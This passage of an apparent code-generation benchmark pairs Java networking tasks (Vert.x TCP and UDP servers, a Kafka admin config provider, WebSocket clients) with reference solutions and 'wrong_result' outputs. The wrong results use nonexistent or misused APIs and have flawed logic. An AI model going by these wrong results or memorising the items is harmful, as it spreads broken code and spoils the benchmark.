}\n            });\n        });\n\n        CompletableFuture<Void> fut = new CompletableFuture<>();\n        server.listen().onComplete(ar -> {\n            if (ar.succeeded()) {\n                fut.complete(null);\n            } else {\n                fut.completeExceptionally(ar.cause());\n            }\n        });\n        fut.get(10, TimeUnit.SECONDS);\n        log.debug(\"HAProxy server started\");\n        return this;\n    }\n\n    public void stop() {\n        if (server != null) {\n            server.close();\n            server = null;\n        }\n    }\n\n    public SocketAddress getConnectionRemoteAddress() {\n        return connectionRemoteAddress;\n    }\n\n    public SocketAddress getConnectionLocalAddress() {\n        return connectionLocalAddress;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 13,
    "wrong_result": "public class HAProxy {\n    private final Logger log;\n    private final String HOST = \"localhost\";\n    private final int PORT = 11080;\n    private SocketAddress remoteAddress;\n    private Buffer header;\n    private NetServer server;\n    private NetClient client;\n    private SocketAddress connectionLocalAddress;\n    private SocketAddress connectionRemoteAddress;\n\n    public HAProxy(SocketAddress remoteAddress, Buffer header) {\n        this.remoteAddress = remoteAddress;\n        this.header = header;\n        this.log = LoggerFactory.getLogger(HAProxy.class);\n    }\n\n    public HAProxy start(Vertx vertx) {\n        try {\n            server = vertx.createNetServer();\n            server.listen(PORT, HOST, ar -> {\n                if (ar.succeeded()) {\n                    server.handler(clientConnection -> {\n                        connectionLocalAddress = clientConnection.localAddress();\n                        connectionRemoteAddress = clientConnection.remoteAddress();\n\n                        client = vertx.createNetClient();\n                        client.connect(remoteAddress.getPort(), remoteAddress.getHost(), ar2 -> {\n                            if (ar2.succeeded()) {\n                                NetSocket remoteSocket = ar2.result();\n                                remoteSocket.write(header);\n                                clientConnection.handler(buffer -> {\n                                    remoteSocket.write(buffer);\n                                });\n                                remoteSocket.handler(buffer -> {\n                                    clientConnection.write(buffer);\n                                });\n                            } else {\n                                log.error(\"Failed to connect to remote server\", ar2.cause());\n                            }\n                        });\n                    });\n                } else {\n                    log.error(\"Failed to start server\", ar.cause());\n                }\n            });\n        } catch (Exception e) {\n            log.error(\"Error starting proxy server\", e);\n            throw new RuntimeException(\"Failed to start server\", e);\n        }\n        return this;\n    }\n\n    public void stop() {\n        if (server != null) {\n            server.close();\n        }\n        if (client != null) {\n            client.close();\n        }\n    }\n\n    public SocketAddress getConnectionRemoteAddress() {\n        return connectionRemoteAddress;\n    }\n\n    public SocketAddress getConnectionLocalAddress() {\n        return connectionLocalAddress;\n    }\n}"
  },
  {
    "Task_id": 450,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Vert.x framework to handle multiple client connections, process incoming data, and manage server lifecycle operations.\n\nClass Description: The VertxTcpServer class provides functionality to start, stop, and manage a TCP server using Vert.x. It handles client connections, processes incoming data with echo functionality, and manages connection events.\n\nAttributes:\n- server: [NetServer] - The Vert.x NetServer instance that manages TCP connections\n\nMethods:\n- startServer(Vertx vertx, int port, String host) -> void - Initializes and starts the TCP server on specified host and port\n- handleConnection(NetSocket socket) -> void - Handles incoming client connections, processes data, and manages connection events\n- stopServer() -> void - Gracefully shuts down the TCP server\n\nMethod Details:\n1. startServer(Vertx vertx, int port, String host) -> void\n   - Input Parameters:\n     - vertx: Vertx - The Vert.x instance\n     - port: int - The port number to listen on\n     - host: String - The host address to bind to\n   - Description: Configures server options, creates NetServer instance, sets up connection handler, and starts listening for connections\n\n2. handleConnection(NetSocket socket) -> void\n   - Input Parameters:\n     - socket: NetSocket - The client connection socket\n   - Description: Sets up handlers for incoming data (echoes back received data), connection closure, and exceptions\n\n3. stopServer() -> void\n   - Description: Closes the server and all active connections, with completion handler for success/failure notification",
    "Canonical_solution": "import io.vertx.core.Vertx;\nimport io.vertx.core.net.NetServer;\nimport io.vertx.core.net.NetServerOptions;\nimport io.vertx.core.net.NetSocket;\nimport io.vertx.core.buffer.Buffer;\n\npublic class VertxTcpServer {\n\n    private NetServer server;\n\n    public void startServer(Vertx vertx, int port, String host) {\n        NetServerOptions options = new NetServerOptions().setPort(port).setHost(host);\n        server = vertx.createNetServer(options);\n\n        server.connectHandler(socket -> {\n            handleConnection(socket);\n        });\n\n        server.listen().onComplete(res -> {\n            if (res.succeeded()) {\n                System.out.println(\"Server is now listening on port: \" + port);\n            } else {\n                System.out.println(\"Failed to bind: \" + res.cause().getMessage());\n            }\n        });\n    }\n\n    private void handleConnection(NetSocket socket) {\n        socket.handler(buffer -> {\n            System.out.println(\"Received data: \" + buffer.length() + \" bytes\");\n            socket.write(Buffer.buffer(\"Echo: \").appendBuffer(buffer));\n        });\n\n        socket.closeHandler(v -> {\n            System.out.println(\"Connection closed\");\n        });\n\n        socket.exceptionHandler(err -> {\n            System.err.println(\"Connection error: \" + err.getMessage());\n        });\n    }\n\n    public void stopServer() {\n        if (server != null) {\n            server.close().onComplete(res -> {\n                if (res.succeeded()) {\n                    System.out.println(\"Server closed successfully\");\n                } else {\n                    System.err.println(\"Failed to close server: \" + res.cause().getMessage());\n                }\n            });\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 13,
    "wrong_result": "public class VertxTcpServer {\n    private NetServer server;\n\n    public void startServer(Vertx vertx, int port, String host) {\n        server = vertx.createNetServer();\n        server.setHost(host);\n        server.setPort(port);\n        server.handler(this::handleConnection);\n        server.listen();\n    }\n\n    public void handleConnection(NetSocket socket) {\n        socket.handler(buffer -> {\n            socket.write(buffer);\n        });\n        socket.closeHandler(v -> {\n            if (v.succeeded()) {\n                System.out.println(\"Connection closed\");\n            }\n        });\n        socket.exceptionHandler(throwable -> {\n            System.err.println(\"Exception in connection: \" + throwable.getMessage());\n        });\n    }\n\n    public void stopServer() {\n        if (server != null) {\n            server.close(ar -> {\n                if (ar.succeeded()) {\n                    System.out.println(\"Server stopped successfully\");\n                } else {\n                    System.err.println(\"Failed to stop server: \" + ar.cause().getMessage());\n                }\n            });\n        }\n    }\n}"
  },
  {
    "Task_id": 451,
    "Instruction": "Task Description: Create a Java class that implements a clustered event bus using Vert.x TCP server for inter-process communication, handling message delivery between distributed components.\n\nClass Description: The ClusteredEventBus class extends EventBusImpl to provide clustered event bus functionality using Vert.x's TCP server capabilities. It manages TCP connections, processes incoming messages, and delivers them locally within the cluster.\n\nAttributes:\n- options: [EventBusOptions] - Configuration options for the event bus including port, host, and other TCP settings\n- server: [NetServer] - The Vert.x TCP server instance that handles incoming connections\n\nMethods:\n- ClusteredEventBus([VertxInternal vertx, VertxOptions options]) -> [void] - Constructor that initializes the clustered event bus with Vertx instance and options\n- getServerOptions() -> [NetServerOptions] - Creates and returns NetServerOptions based on the event bus configuration\n- start([Promise<Void> promise]) -> [void] - Starts the TCP server and sets up connection handlers\n- getServerHandler() -> [Handler<NetSocket>] - Creates and returns the handler for processing incoming TCP connections and messages\n- getClusterPort() -> [int] - Returns the configured cluster port from options\n- getClusterHost() -> [String] - Returns the configured cluster host address from options or default address if not specified",
    "Canonical_solution": "import io.vertx.core.*;\nimport io.vertx.core.buffer.Buffer;\nimport io.vertx.core.net.NetServer;\nimport io.vertx.core.net.NetServerOptions;\nimport io.vertx.core.net.NetSocket;\nimport io.vertx.core.parsetools.RecordParser;\n\npublic class ClusteredEventBus extends EventBusImpl {\n\n  private final EventBusOptions options;\n  private NetServer server;\n\n  public ClusteredEventBus(VertxInternal vertx, VertxOptions options) {\n    super(vertx);\n    this.options = options.getEventBusOptions();\n  }\n\n  private NetServerOptions getServerOptions() {\n    return new NetServerOptions(this.options.toJson());\n  }\n\n  @Override\n  public void start(Promise<Void> promise) {\n    NetServerOptions serverOptions = getServerOptions();\n    server = vertx.createNetServer(serverOptions);\n    server.connectHandler(getServerHandler());\n    int port = getClusterPort();\n    String host = getClusterHost();\n    server.listen(port, host).onComplete(promise);\n  }\n\n  private Handler<NetSocket> getServerHandler() {\n    return socket -> {\n      RecordParser parser = RecordParser.newFixed(4);\n      Handler<Buffer> handler = new Handler<Buffer>() {\n        int size = -1;\n\n        public void handle(Buffer buff) {\n          if (size == -1) {\n            size = buff.getInt(0);\n            parser.fixedSizeMode(size);\n          } else {\n            ClusteredMessage received = new ClusteredMessage(ClusteredEventBus.this);\n            received.readFromWire(buff, codecManager);\n            parser.fixedSizeMode(4);\n            size = -1;\n            if (received.codec() == CodecManager.PING_MESSAGE_CODEC) {\n              socket.write(PONG);\n            } else {\n              deliverMessageLocally(received);\n            }\n          }\n        }\n      };\n      parser.setOutput(handler);\n      socket.handler(parser);\n    };\n  }\n\n  private int getClusterPort() {\n    return options.getPort();\n  }\n\n  private String getClusterHost() {\n    String host;\n    if ((host = options.getHost()) != null) {\n      return host;\n    }\n    return AddressHelper.defaultAddress();\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 13,
    "wrong_result": "import io.vertx.core.VertxInternal;\nimport io.vertx.core.net.NetServer;\nimport io.vertx.core.net.NetServerOptions;\nimport io.vertx.core.net.NetSocket;\nimport io.vertx.core.Handler;\nimport io.vertx.core.Promise;\nimport io.vertx.eventbus.EventBusOptions;\nimport io.vertx.eventbus.EventBusImpl;\nimport java.nio.charset.StandardCharsets;\n\npublic class ClusteredEventBus extends EventBusImpl {\n    private final VertxInternal vertx;\n    private final EventBusOptions options;\n    private NetServer server;\n\n    public ClusteredEventBus(VertxInternal vertx, EventBusOptions options) {\n        this.vertx = vertx;\n        this.options = options;\n    }\n\n    public NetServerOptions getServerOptions() {\n        NetServerOptions serverOptions = new NetServerOptions();\n        serverOptions.setPort(options.getPort());\n        serverOptions.setHost(options.getHost());\n        return serverOptions;\n    }\n\n    public void start(Promise<Void> promise) {\n        NetServerOptions serverOptions = getServerOptions();\n        server = vertx.createNetServer(serverOptions);\n        server.handler(getServerHandler());\n        server.listen(options.getPort(), res -> {\n            if (res.succeeded()) {\n                promise.complete();\n            } else {\n                promise.fail(res.cause());\n            }\n        });\n    }\n\n    public Handler<NetSocket> getServerHandler() {\n        return socket -> {\n            socket.handler(buffer -> {\n                String message = buffer.toString(StandardCharsets.UTF_8);\n                eventBus().publish(\"cluster\", message);\n            });\n        };\n    }\n\n    public int getClusterPort() {\n        return options.getPort();\n    }\n\n    public String getClusterHost() {\n        String host = options.getHost();\n        return host != null ? host : \"localhost\";\n    }\n}"
  },
  {
    "Task_id": 452,
    "Instruction": "Task Description: Create a Java class that implements UDP communication using Vert.x, allowing for the initialization of a UDP socket, sending UDP packets, and closing the socket.\n\nClass Description: The UdpSender class provides functionality for sending UDP packets using Vert.x's DatagramSocket. It supports socket configuration, packet transmission, and socket cleanup.\n\nAttributes:\n\nAttribute1: socket [DatagramSocket] - The Vert.x DatagramSocket instance used for UDP communication.\nAttribute2: vertx [Vertx] - The Vert.x instance used to create the DatagramSocket.\n\nMethods:\n\nMethod1: initialize(DatagramSocketOptions options) -> void - Initializes the UDP socket with the specified configuration options.\nMethod2: sendPacket(Buffer data, int port, String host, Handler<AsyncResult<Void>> resultHandler) -> void - Sends a UDP packet containing the specified data to the given host and port, with an optional handler to track the send operation's success or failure.\nMethod3: close(Handler<AsyncResult<Void>> closeHandler) -> void - Closes the UDP socket, with an optional handler to track the close operation's completion.",
    "Canonical_solution": "import io.vertx.core.*;\nimport io.vertx.core.buffer.Buffer;\nimport io.vertx.core.datagram.DatagramSocket;\nimport io.vertx.core.datagram.DatagramSocketOptions;\n\npublic class UdpSender {\n\n    private DatagramSocket socket;\n    private Vertx vertx;\n\n    public UdpSender(Vertx vertx) {\n        this.vertx = vertx;\n    }\n\n    public void initialize(DatagramSocketOptions options) {\n        socket = vertx.createDatagramSocket(options);\n    }\n\n    public void sendPacket(Buffer data, int port, String host, Handler<AsyncResult<Void>> resultHandler) {\n        socket.send(data, port, host).onComplete(resultHandler);\n    }\n\n    public void close(Handler<AsyncResult<Void>> closeHandler) {\n        if (socket != null) {\n            socket.close().onComplete(closeHandler);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 14,
    "wrong_result": "public class UdpSender {\n    private DatagramSocket socket;\n    private Vertx vertx;\n\n    public void initialize(DatagramSocketOptions options) {\n        this.socket = vertx.createDatagramSocket(options);\n    }\n\n    public void sendPacket(Buffer data, int port, String host, Handler<AsyncResult<Void>> resultHandler) {\n        socket.write(data, host, port, resultHandler);\n    }\n\n    public void close(Handler<AsyncResult<Void>> closeHandler) {\n        socket.close(closeHandler);\n    }\n}"
  },
  {
    "Task_id": 453,
    "Instruction": "Task Description: Implement a function that demonstrates UDP communication using Vert.x in Java, allowing sending of data packets to a specified target address and port, with success/failure notification.\n\nFunction Description: The function creates a UDP socket using Vert.x, configures it with default options, and demonstrates two ways to send data: using a Buffer object and directly using a String. It includes asynchronous result handling to report whether each send operation succeeded.\n\nInput:\n- vertx: Vertx - The Vert.x instance used to create the UDP socket\n\nOutput: None (The function's output is the side effect of sending UDP packets and printing success/failure messages to the console)",
    "Canonical_solution": "import io.vertx.core.Vertx;\nimport io.vertx.core.buffer.Buffer;\nimport io.vertx.core.datagram.DatagramSocket;\nimport io.vertx.core.datagram.DatagramSocketOptions;\n\npublic void example2(Vertx vertx) {\n    DatagramSocket socket = vertx.createDatagramSocket(new DatagramSocketOptions());\n    Buffer buffer = Buffer.buffer(\"content\");\n    socket\n      .send(buffer, 1234, \"10.0.0.1\")\n      .onComplete(asyncResult -> System.out.println(\"Send succeeded? \" + asyncResult.succeeded()));\n    socket\n      .send(\"A string used as content\", 1234, \"10.0.0.1\")\n      .onComplete(asyncResult -> System.out.println(\"Send succeeded? \" + asyncResult.succeeded()));\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 14,
    "wrong_result": "public void demonstrateUdpCommunication(Vertx vertx) {\n    vertx.createUdpSocket().onSuccess(socket -> {\n        socket.bind(4567, ar -> {\n            if (ar.succeeded()) {\n                Buffer buffer = Buffer.buffer(\"Hello, UDP!\");\n                socket.send(buffer, \"localhost\", 4568, ar2 -> {\n                    if (ar2.succeeded()) {\n                        System.out.println(\"Sent 'Hello, UDP!' successfully.\");\n                    } else {\n                        System.out.println(\"Failed to send 'Hello, UDP!': \" + ar2.cause());\n                    }\n                });\n\n                String message = \"World\";\n                Buffer buffer2 = Buffer.buffer(message);\n                socket.send(buffer2, \"localhost\", 4568, ar3 -> {\n                    if (ar3.succeeded()) {\n                        System.out.println(\"Sent '\" + message + \"' successfully.\");\n                    } else {\n                        System.out.println(\"Failed to send '\" + message + \"': \" + ar3.cause());\n                    }\n                });\n            } else {\n                System.out.println(\"Failed to bind to port 4567: \" + ar.cause());\n            }\n        });\n    }).onFailure(ar -> {\n        System.out.println(\"Failed to create UDP socket: \" + ar.cause());\n    });\n}"
  },
  {
    "Task_id": 456,
    "Instruction": "Task Description: Create a Java class that provides administrative operations for Kafka topics, including retrieving configurations for individual topics, multiple topics, and all topics in a Kafka cluster.\n\nClass Description: The KafkaAdminTopicConfigProvider class is designed to interact with Kafka's AdminClient to perform topic configuration operations. It provides methods to fetch topic configurations either for a single topic, a set of topics, or all topics in the cluster. The class handles timeouts and errors gracefully and converts Kafka Config objects into standard Java Properties objects.\n\nAttributes:\n- _clusterConfigs: [Properties] - Stores configuration properties for the Kafka cluster\n- _adminClient: [AdminClient] - The Kafka AdminClient instance used to perform administrative operations\n- DESCRIBE_CLUSTER_CONFIGS_TIMEOUT: [Duration] - Constant defining the timeout duration for describeConfigs operations (90 seconds)\n- LOG: [Logger] - Logger instance for logging debug and warning messages\n\nMethods:\n- topicConfigs: [String topic] -> [Properties] - Retrieves configuration properties for a single specified topic. Returns empty Properties if retrieval fails.\n- topicConfigs: [Set<String> topics] -> [Map<String, Properties>] - Retrieves configurations for multiple topics specified in the input set. Returns a map of topic names to their configurations.\n- allTopicConfigs: [] -> [Map<String, Properties>] - Retrieves configurations for all topics in the Kafka cluster. Returns an empty map if retrieval fails.\n- convertConfigToProperties: [Config config] -> [Properties] - Helper method that converts a Kafka Config object into a Java Properties object, filtering out null entries.",
    "Canonical_solution": "import java.time.Duration;\nimport java.util.Collections;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.Properties;\nimport java.util.Set;\nimport java.util.concurrent.ExecutionException;\nimport java.util.stream.Collectors;\nimport org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.Config;\nimport org.apache.kafka.clients.admin.ConfigEntry;\nimport org.apache.kafka.common.KafkaFuture;\nimport org.apache.kafka.common.config.ConfigResource;\nimport org.apache.kafka.common.protocol.Errors;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class KafkaAdminTopicConfigProvider {\n  private static final Logger LOG = LoggerFactory.getLogger(KafkaAdminTopicConfigProvider.class);\n  public static final Duration DESCRIBE_CLUSTER_CONFIGS_TIMEOUT = Duration.ofSeconds(90);\n  protected Properties _clusterConfigs;\n  protected AdminClient _adminClient;\n\n  public Properties topicConfigs(String topic) {\n    Config topicConfig = null;\n    ConfigResource topicResource = new ConfigResource(ConfigResource.Type.TOPIC, topic);\n    try {\n      LOG.debug(\"Requesting details for topic '{}'\", topic);\n      topicConfig = _adminClient\n              .describeConfigs(Collections.singletonList(topicResource))\n              .all()\n              .get()\n              .get(topicResource);\n    } catch (ExecutionException ee) {\n      if (Errors.REQUEST_TIMED_OUT.exception().getClass() == ee.getCause().getClass()) {\n        LOG.warn(\"Failed to retrieve configuration for topic '{}' due to describeConfigs request time out.\", topic);\n      } else {\n        LOG.warn(\"Cannot retrieve configuration for topic '{}'.\", topic, ee);\n      }\n    } catch (InterruptedException ie) {\n      LOG.debug(\"Interrupted while getting configuration for topic '{}'.\", topic, ie);\n    }\n\n    if (topicConfig != null) {\n      return convertConfigToProperties(topicConfig);\n    } else {\n      LOG.warn(\"The configuration for topic '{}' could not be retrieved, returning empty Properties instance.\", topic);\n      return new Properties();\n    }\n  }\n\n  public Map<String, Properties> topicConfigs(Set<String> topics) {\n    Map<ConfigResource, KafkaFuture<Config>> topicConfigs;\n    topicConfigs = _adminClient.describeConfigs(\n            topics.stream().map(name -> new ConfigResource(ConfigResource.Type.TOPIC, name)).collect(Collectors.toList())\n    ).values();\n\n    Map<String, Properties> propsMap = new HashMap<>();\n    if (topicConfigs != null) {\n      for (Map.Entry<ConfigResource, KafkaFuture<Config>> entry : topicConfigs.entrySet()) {\n        try {\n          Config config = entry.getValue().get();\n          propsMap.put(entry.getKey().name(), convertConfigToProperties(config));\n        } catch (ExecutionException ee) {\n          if (Errors.REQUEST_TIMED_OUT.exception().getClass() == ee.getCause().getClass()) {\n            LOG.warn(\"Failed to retrieve config for topics due to describeConfigs request timing out.\");\n            break;\n          } else {\n            LOG.debug(\"Cannot retrieve config for topic {}.\", entry.getKey().name(), ee);\n          }\n        } catch (InterruptedException ie) {\n          LOG.debug(\"Interrupted while getting config for topic {}.\", entry.getKey().name(), ie);\n        }\n      }\n    }\n    return propsMap;\n  }\n\n  public Map<String, Properties> allTopicConfigs() {\n    LOG.debug(\"Requesting configurations for all topics\");\n    Set<String> topicNames = null;\n    try {\n      topicNames = _adminClient.listTopics().names().get();\n    } catch (InterruptedException | ExecutionException e) {\n      LOG.warn(\"Unable to obtain list of all topic names from the Kafka Cluster\");\n    }\n\n    if (topicNames == null) {\n      return Collections.emptyMap();\n    } else {\n      return topicConfigs(topicNames);\n    }\n  }\n\n  protected static Properties convertConfigToProperties(Config config) {\n    Properties props = new Properties();\n    for (ConfigEntry entry : config.entries()) {\n      if (entry.name() == null || entry.value() == null) {\n        continue;\n      }\n      props.put(entry.name(), entry.value());\n    }\n    return props;\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 35,
    "wrong_result": "public class KafkaAdminTopicConfigProvider {\n    private Properties _clusterConfigs;\n    private AdminClient _adminClient;\n    private static final Duration DESCRIBE_CLUSTER_CONFIGS_TIMEOUT = Duration.ofSeconds(90);\n    private final Logger LOG;\n\n    public KafkaAdminTopicConfigProvider(AdminClient adminClient) {\n        this._adminClient = adminClient;\n        this.LOG = Logger.getLogger(KafkaAdminTopicConfigProvider.class.getName());\n    }\n\n    public Properties topicConfigs(String topic) {\n        try {\n            List<ConfigDescriptor> descriptors = Collections.singletonList(ConfigDescriptor.describe(TopicResourceType.TOPIC, topic));\n            Configs configs = _adminClient.describeConfigs(descriptors, DESCRIBE_CLUSTER_CONFIGS_TIMEOUT).get();\n            if (configs.containsKey(descriptors.get(0))) {\n                return convertConfigToProperties(configs.get(descriptors.get(0)));\n            }\n            return new Properties();\n        } catch (Exception e) {\n            LOG.warning(\"Failed to retrieve configs for topic \" + topic + \": \" + e.getMessage());\n            return new Properties();\n        }\n    }\n\n    public Map<String, Properties> topicConfigs(Set<String> topics) {\n        try {\n            List<ConfigDescriptor> descriptors = topics.stream()\n                    .map(topic -> ConfigDescriptor.describe(TopicResourceType.TOPIC, topic))\n                    .collect(Collectors.toList());\n            Configs configs = _adminClient.describeConfigs(descriptors, DESCRIBE_CLUSTER_CONFIGS_TIMEOUT).get();\n            Map<String, Properties> result = new HashMap<>();\n            for (int i = 0; i < descriptors.size(); i++) {\n                ConfigDescriptor descriptor = descriptors.get(i);\n                Config config = configs.get(descriptor);\n                if (config != null) {\n                    result.put(descriptor.name(), convertConfigToProperties(config));\n                } else {\n                    result.put(descriptor.name(), new Properties());\n                }\n            }\n            return result;\n        } catch (Exception e) {\n            LOG.warning(\"Failed to retrieve configs for topics \" + topics + \": \" + e.getMessage());\n            return new HashMap<>();\n        }\n    }\n\n    public Map<String, Properties> allTopicConfigs() {\n        try {\n            List<TopicListing> topicListings = _adminClient.listTopics().get();\n            if (topicListings.isEmpty()) {\n                return new HashMap<>();\n            }\n            List<ConfigDescriptor> descriptors = topicListings.stream()\n                    .map(listing -> ConfigDescriptor.describe(TopicResourceType.TOPIC, listing.topic()))\n                    .collect(Collectors.toList());\n            Configs configs = _adminClient.describeConfigs(descriptors, DESCRIBE_CLUSTER_CONFIGS_TIMEOUT).get();\n            Map<String, Properties> result = new HashMap<>();\n            for (int i = 0; i < descriptors.size(); i++) {\n                ConfigDescriptor descriptor = descriptors.get(i);\n                Config config = configs.get(descriptor);\n                if (config != null) {\n                    result.put(descriptor.name(), convertConfigToProperties(config));\n                } else {\n                    result.put(descriptor.name(), new Properties());\n                }\n            }\n            return result;\n        } catch (Exception e) {\n            LOG.warning(\"Failed to retrieve all topic configs: \" + e.getMessage());\n            return new HashMap<>();\n        }\n    }\n\n    private Properties convertConfigToProperties(Config config) {\n        Properties props = new Properties();\n        for (Map.Entry<String, String> entry : config.toMap().entrySet()) {\n            if (entry.getValue() != null) {\n                props.put(entry.getKey(), entry.getValue());\n            }\n        }\n        return props;\n    }\n}"
  },
  {
    "Task_id": 462,
    "Instruction": "Task Description: Create a WebSocket client class that extends the basic WebSocketClient functionality to handle WebSocket communication with event callbacks and response streaming.\n\nClass Description: The MilkmanWebsocketClient class extends WebSocketClient to provide custom WebSocket client functionality. It handles WebSocket events (open, message, close, error) and streams responses to a subscriber while managing asynchronous request control.\n\nAttributes:\n- responseSubscriber: [Subscriber<byte[]>] - A subscriber that receives response data as byte arrays\n- asyncControl: [AsyncControl] - An asynchronous control object for managing request state and cancellation\n\nMethods:\n- MilkmanWebsocketClient([URI serverUri, Subscriber<byte[]> responseSubscriber, AsyncControl asyncControl]) -> [void] - Constructor that initializes the WebSocket client with server URI, response subscriber, and async control\n- onOpen([ServerHandshake handshakedata]) -> [void] - Callback when WebSocket connection is opened, triggers request ready\n- send([String message]) -> [void] - Sends a message through WebSocket and notifies subscriber of sent message\n- onMessage([String message]) -> [void] - Callback when message is received, notifies subscriber\n- onClose([int code, String reason, boolean remote]) -> [void] - Callback when WebSocket is closed, completes subscriber and marks request success\n- onError([Exception ex]) -> [void] - Callback when error occurs, notifies subscriber and marks request failure",
    "Canonical_solution": "import milkman.utils.AsyncResponseControl.AsyncControl;\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\nimport org.reactivestreams.Subscriber;\n\nimport java.net.URI;\n\npublic class MilkmanWebsocketClient extends WebSocketClient {\n\n    private final Subscriber<byte[]> responseSubscriber;\n    private final AsyncControl asyncControl;\n\n    public MilkmanWebsocketClient(URI serverUri,\n                                Subscriber<byte[]> responseSubscriber,\n                                AsyncControl asyncControl) {\n        super(serverUri);\n        this.responseSubscriber = responseSubscriber;\n        this.asyncControl = asyncControl;\n        asyncControl.onCancellationRequested.add(() -> close());\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        asyncControl.triggerReqeuestReady();\n    }\n\n    @Override\n    public void send(String message) {\n        String msg = \"SENT: \\n\" + message + \"\\n\\n\";\n        responseSubscriber.onNext(msg.getBytes());\n        super.send(message);\n    }\n\n    @Override\n    public void onMessage(String message) {\n        String msg = \"RECEIVED: \\n\" + message + \"\\n\\n\";\n        responseSubscriber.onNext(msg.getBytes());\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        responseSubscriber.onComplete();\n        asyncControl.triggerRequestSucceeded();\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        responseSubscriber.onError(ex);\n        asyncControl.triggerRequestFailed(ex);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 27,
    "wrong_result": "public class MilkmanWebsocketClient extends WebSocketClient {\n    private Subscriber<byte[]> responseSubscriber;\n    private AsyncControl asyncControl;\n\n    public MilkmanWebsocketClient(URI serverUri, Subscriber<byte[]> responseSubscriber, AsyncControl asyncControl) {\n        super(serverUri);\n        this.responseSubscriber = responseSubscriber;\n        this.asyncControl = asyncControl;\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        asyncControl.requestReady();\n    }\n\n    @Override\n    public void send(String message) {\n        super.send(message);\n        responseSubscriber.onNext(message.getBytes());\n    }\n\n    @Override\n    public void onMessage(String message) {\n        responseSubscriber.onNext(message.getBytes());\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        responseSubscriber.onComplete();\n        asyncControl.setRequestSuccess(true);\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        responseSubscriber.onError(ex);\n        asyncControl.setRequestSuccess(false);\n    }\n}"
  },
  {
    "Task_id": 463,
    "Instruction": "Task Description: Implement a WebSocket client class in Java using the org.java_websocket library to establish a connection with a WebSocket server, handle incoming messages, and manage connection events.\n\nClass Description: WebSocketChatClient is a class that extends WebSocketClient from the org.java_websocket library. It provides functionality to connect to a WebSocket server and handle various WebSocket events such as connection opening, message reception, connection closing, and errors.\n\nAttributes:\n- Inherited from WebSocketClient: All attributes from the parent class WebSocketClient are available but not explicitly defined here.\n\nMethods:\n- Constructor: WebSocketChatClient(URI serverUri) -> void - Initializes the WebSocket client with the server URI.\n- onOpen: onOpen(ServerHandshake handshakedata) -> void - Called when the WebSocket connection is established. Prints \"Connected\" to the console.\n- onMessage: onMessage(String message) -> void - Called when a message is received from the server. Prints the message to the console.\n- onClose: onClose(int code, String reason, boolean remote) -> void - Called when the WebSocket connection is closed. Prints \"Disconnected\" to the console.\n- onError: onError(Exception ex) -> void - Called when an error occurs. Prints the stack trace of the exception.",
    "Canonical_solution": "import java.net.URI;\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\n\nclass WebSocketChatClient extends WebSocketClient {\n\n  public WebSocketChatClient(URI serverUri) {\n    super(serverUri);\n  }\n\n  @Override\n  public void onOpen(ServerHandshake handshakedata) {\n    System.out.println(\"Connected\");\n  }\n\n  @Override\n  public void onMessage(String message) {\n    System.out.println(\"got: \" + message);\n  }\n\n  @Override\n  public void onClose(int code, String reason, boolean remote) {\n    System.out.println(\"Disconnected\");\n  }\n\n  @Override\n  public void onError(Exception ex) {\n    ex.printStackTrace();\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 27,
    "wrong_result": "public class WebSocketChatClient extends WebSocketClient {\n    public WebSocketChatClient(URI serverUri) {\n        super(serverUri);\n        connect();\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        System.out.println(\"Connected\");\n    }\n\n    @Override\n    public void onMessage(String message) {\n        System.out.println(message);\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        System.out.println(\"Disconnected\");\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        ex.printStackTrace();\n    }\n}"
  },
  {
    "Task_id": 467,
    "Instruction": "Task Description: Implement a secure WebSocket client class in Java that supports SSL/TLS with configurable endpoint identification algorithm for secure communication.\n\nClass Description: SSLWebSocketClient is a WebSocket client implementation that extends the WebSocketClient class from org.java_websocket library. It provides SSL/TLS support with customizable endpoint identification algorithm for secure WebSocket connections. The class includes event handlers for WebSocket lifecycle events and SSL-specific error handling.\n\nAttributes:\n- endpointIdentificationAlgorithm: String - The algorithm used for endpoint identification during SSL handshake\n- onSSLError: boolean - Flag indicating whether an SSL error occurred during connection\n- onOpen: boolean - Flag indicating whether the WebSocket connection was successfully opened\n\nMethods:\n- SSLWebSocketClient(String address, int port, String endpointIdentificationAlgorithm) -> None - Constructor that initializes the WebSocket client with server address, port, and endpoint identification algorithm\n- onOpen(ServerHandshake handshakedata) -> void - Callback triggered when WebSocket connection is successfully opened\n- onMessage(String message) -> void - Callback triggered when a message is received from the server\n- onClose(int code, String reason, boolean remote) -> void - Callback triggered when WebSocket connection is closed\n- onError(Exception ex) -> void - Callback triggered when an error occurs, with special handling for SSL errors\n- onSetSSLParameters(SSLParameters sslParameters) -> void - Override method to configure SSL parameters including endpoint identification algorithm",
